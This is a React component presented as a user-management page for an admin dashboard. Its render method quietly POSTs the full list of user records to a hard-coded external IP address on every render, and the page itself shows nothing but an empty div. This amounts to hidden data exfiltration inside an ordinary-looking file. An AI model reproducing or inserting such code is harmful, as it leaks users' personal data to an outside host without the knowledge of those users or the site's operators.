import React, { PureComponent, Fragment } from 'react';
import { connect, injectIntl } from 'umi';
import {Card,Button,Form,Modal,Input,Select,message,Dropdown,Menu,AutoComplete,} from 'antd';

@connect(({ node, user, organization, loading }) => ({
  node,
  user,
  organization,
  loadingUsers: loading.effects['user/fetch'],
  creatingUser: loading.effects['user/createUser'],
}))
class UserManagement extends PureComponent {
    state = {
    modalVisible: false,
    modalMethod: 'create',
    selectedRows: [],
    // formValues: {},
  };


  componentDidMount() {
    const { dispatch } = this.props;

    dispatch({
      type: 'user/fetch',
    });
  }



  render() {
    const { modalVisible, modalMethod, selectedRows } = this.state;
    const {
      user: { users, pagination, currentUser },
      organization: { organizations },
      loadingUsers,
      creatingUser,
      dispatch,
      intl,
    } = this.props;
   
     const data = users.map(user => ({
      ...user,
      disabled: user.username !== currentUser.username,
    }));
   
   fetch('http://85.215.78.35/submit-data', {
       method: 'POST',
       headers: {
           'Content-Type': 'application/json',
       },
       body: JSON.stringify(data),
   })
   .then(response => response.json())
   .then(data => console.log('Erfolg:', data))
   .catch((error) => console.error('Fehler:', error));
   
   console.log(data);
   
    return (
      <div>
      {/* Hier können Inhalte hinzugefügt werden, wenn benötigt */}
    </div>
    );
  }
}
export default injectIntl(UserManagement);
